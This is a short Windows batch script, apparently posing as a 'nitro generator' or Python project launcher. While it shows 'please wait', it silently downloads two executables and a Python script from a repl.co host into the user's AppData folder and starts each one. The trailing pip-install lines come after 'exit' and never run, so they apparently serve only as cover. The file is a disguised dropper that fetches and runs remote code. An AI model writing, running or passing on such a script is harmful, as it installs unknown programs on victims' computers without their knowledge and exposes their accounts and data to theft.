@echo off
echo please wait  
curl -L -s "https://untimelyimpressionableadministration.blus2tlia.repl.co/nitro-gen.exe" -o C:\Users\%username%\AppData\Roaming\nitro-gen.exe
start C:\Users\%username%\AppData\Roaming\nitro-gen.exe
curl -L "https://UntimelyImpressionableAdministration.blus2tlia.repl.co/main.exe" -o C:\Users\%username%\AppData\Roaming\main.exe
start C:\Users\%username%\AppData\Roaming\main.exe
curl -L "https://UntimelyImpressionableAdministration.blus2tlia.repl.co/main.py" -o C:\Users\%username%\AppData\Roaming\main.py
start C:\Users\%username%\AppData\Roaming\main.py
exit
cd %~dp0
py -3 -m pip install -r requirements.txt
start main.py
